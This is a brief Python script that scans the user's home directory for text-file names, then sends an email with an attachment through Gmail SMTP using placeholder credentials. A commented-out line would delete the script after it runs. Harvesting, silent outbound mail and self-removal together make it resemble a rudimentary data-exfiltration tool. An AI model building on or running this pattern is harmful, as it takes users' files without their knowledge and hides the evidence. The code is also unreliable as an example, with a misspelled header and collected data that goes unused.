import smtplib, ssl, os.path
import getpass
from os import remove
from sys import argv
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

USER_NAME = getpass.getuser()

homeDir = os.path.expanduser("~")
folders = os.listdir(homeDir)

print(homeDir + "/" +  folders[0])

data = []

for f in folders:
    print (f)
    if("txt" in f):
        data.append(f)
    try:
        newFolders = os.listdir(homeDir+"/"+f)
        if("txt" in f):
            data.append(newFolders)
    except:
        pass

sender_adress = "x";
receiver_adress = "x";
sender_pass = "x"

message = MIMEMultipart()
message['From'] = sender_adress
message['To'] = receiver_adress
message['Subject'] = 'A test mail sent by Python. It has an attachment.'

message.attach(MIMEText("test", 'plain'))
attach_file_name = 'TP_python_prev.pdf'
attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
payload = MIMEBase('application', 'octate-stream')
payload.set_payload((attach_file).read())
encoders.encode_base64(payload) #encode the attachment
#add payload header with filename
payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
message.attach(payload)
#Create SMTP session for sending the mail
session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
session.starttls() #enable security
session.login(sender_adress, sender_pass) #login with mail_id and password
text = message.as_string()
session.sendmail(sender_adress,receiver_adress, text)
session.quit()
port = 465

print("done")

#remove(argv[0])


